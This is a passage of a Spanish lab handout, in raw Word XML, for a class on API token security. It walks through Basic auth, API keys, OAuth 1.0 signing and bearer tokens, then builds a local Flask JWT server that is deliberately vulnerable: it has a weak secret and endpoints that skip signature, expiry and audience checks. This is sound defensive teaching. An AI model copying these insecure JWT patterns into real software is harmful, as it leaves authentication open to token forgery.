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Laboratorio paso a paso — Tokens y seguridad de APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Anexo práctico de la clase "De Basic al DPoP".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Pensado para tenerlo abierto el día de la charla: cada paso tiene comando, resultado esperado y "qué demuestra".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">⚠️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Seguridad primero.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Todos los ataques se ejecutan contra </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>laboratorios locales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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) o endpoints públicos de práctica. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Nunca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> contra sistemas de terceros sin autorización escrita. ID Uruguay se aborda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sólo en modo defensivo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, con tu propia cuenta y tu propio cliente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">🖥️ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Entorno.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Los comandos están en sintaxis bash. En Windows usá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Git Bash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>WSL2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. Requiere: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>docker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python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3.10+, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>curl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git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jq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (opcional). Verificalo en el Paso 0.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Índice</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte A — Calentamiento sin riesgo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte B — Laboratorio JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte C — OIDC, PKCE y refresh con Keycloak</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte D — DPoP (sender-constrained)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte E — OWASP API Top 10 con crAPI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte F — ID Uruguay (defensivo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Limpieza</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Resumen: paso → qué demuestra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte A — Calentamiento sin riesgo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 0 — Verificar herramientas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docker --version</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python --version</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl --version | head -1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>git --version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versiones de cada herramienta. Si falta </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: Windows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>winget install jqlang.jq</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, Linux </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>sudo apt install jq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Paso 1 — HTTP Basic: ver y decodificar credenciales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 Endpoint público de práctica (NO es un sistema de terceros)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -u usuario:clave https://httpbin.org/basic-auth/usuario/clave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# Mirar la cabecera que viaja</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -D - -o /dev/null -u usuario:clave https://httpbin.org/basic-auth/usuario/clave | grep -i authorization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JSON </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>{"authenticated": true, "user": "usuario"}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y una cabecera </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Basic dXN1YXJpbzpjbGF2ZQ==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las credenciales viajan en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> request.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 Base64 NO es cifrado</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo -n "dXN1YXJpbzpjbGF2ZQ==" | base64 -d; echo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usuario:clave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cualquiera que intercepte el tráfico lee la credencial.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 2 — API key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curl -s -H "X-API-Key: clave-de-ejemplo" https://httpbin.org/headers | jq '.headers' 2&gt;/dev/null || curl -s -H "X-API-Key: clave-de-ejemplo" https://httpbin.org/headers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aparece </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>"X-Api-Key": "clave-de-ejemplo"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la clave viaja en claro en una cabecera estática; si se filtra, no expira sola.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 Buscar secretos en TU propio repositorio (no ajenos)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest detect --source /repo -v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reporte (posiblemente vacío en un repo limpio).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cómo se descubren claves hardcodeadas en repos y CI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 3 — OAuth 1.0: entender la firma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cat &gt; oauth1_sign.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import hmac, hashlib, base64, urllib.parse</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>method, url = "GET", "https://api.ejemplo.com/recurso"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>params = {"oauth_consumer_key": "key", "oauth_nonce": "abc123", "oauth_timestamp": "1700000000"}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>base = "&amp;".join([method,</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                 urllib.parse.quote(url, safe=""),</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                 urllib.parse.quote("&amp;".join(f"{k}={params[k]}" for k in sorted(params)), safe="")])</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sig = base64.b64encode(hmac.new(b"secreto", base.encode(), hashlib.sha1).digest()).decode()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("base string:", base)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("oauth_signature:", urllib.parse.quote(sig))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python oauth1_sign.py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se imprime la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>base string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y una firma.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cada request se firma; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cambiar un parámetro invalida la firma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. Es la idea que DPoP recupera 13 años después.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Probalo: cambiá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>"abc123"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>"abc124"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y volvé a correr. La firma cambia por completo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 4 — Bearer: reutilización (sólo tu entorno)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curl -s -H "Authorization: Bearer token-de-ejemplo" https://httpbin.org/bearer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{"authenticated": true, "token": "token-de-ejemplo"}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el servidor no distingue quién porta el token; si lo tenés, entrás. (En clase: copiá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> token y usalo desde otra terminal contra </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> API.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 5 — Cookies (opcional, con Juice Shop)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docker run -d -p 3000:3000 --name juice bkimminich/juice-shop</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Abrí http://localhost:3000, registrate, y en DevTools → Application → Cookies mirá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>HttpOnly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Secure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SameSite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la diferencia entre sesión en cookie (navegador) y bearer en cabecera (API).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte B — Laboratorio JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Este laboratorio es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>deliberadamente vulnerable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y corre </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sólo en local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Paso 6 — Preparar entorno Python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mkdir -p jwt-lab &amp;&amp; cd jwt-lab</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python -m venv .venv</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>source .venv/Scripts/activate   # Windows Git Bash   (Linux/macOS: source .venv/bin/activate)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>pip install flask pyjwt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 7 — Crear el servidor vulnerable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cat &gt; lab_jwt.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># lab_jwt.py — DELIBERADAMENTE VULNERABLE. Sólo 127.0.0.1. NO usar en producción.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from flask import Flask, request, jsonify</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt, datetime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app = Flask(__name__)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>WEAK_SECRET = "secreto"          # débil a propósito (crackeable)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def bearer():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return request.headers.get("Authorization", "").replace("Bearer ", "").strip()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def mint(sub="1", scope="read", aud="lab", exp_min=15):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    payload = {"sub": sub, "scope": scope, "aud": aud, "iss": "https://mi-lab",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">               "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=exp_min)}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jwt.encode(payload, WEAK_SECRET, algorithm="HS256")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@app.route("/token")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def token():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(token=mint())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@app.route("/vuln/novalida")      # simula verificación ausente</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def vuln_novalida():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(ok=True, claims=jwt.decode(bearer(), options={"verify_signature": False}))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@app.route("/vuln/debil")         # secreto débil + no exige exp ni aud</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def vuln_debil():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(ok=True, claims=jwt.decode(bearer(), WEAK_SECRET, algorithms=["HS256"],</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                                              options={"verify_aud": False, "verify_exp": False}))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@app.route("/safe")               # verificación correcta</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def safe():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    claims = jwt.decode(bearer(), WEAK_SECRET, algorithms=["HS256"], audience="lab")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(ok=True, claims=claims)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if __name__ == "__main__":</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.run(host="127.0.0.1", port=5000)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python lab_jwt.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Dejalo corriendo. En </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>otra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> terminal: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curl -s http://127.0.0.1:5000/token | jq -r .token &gt; token.txt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
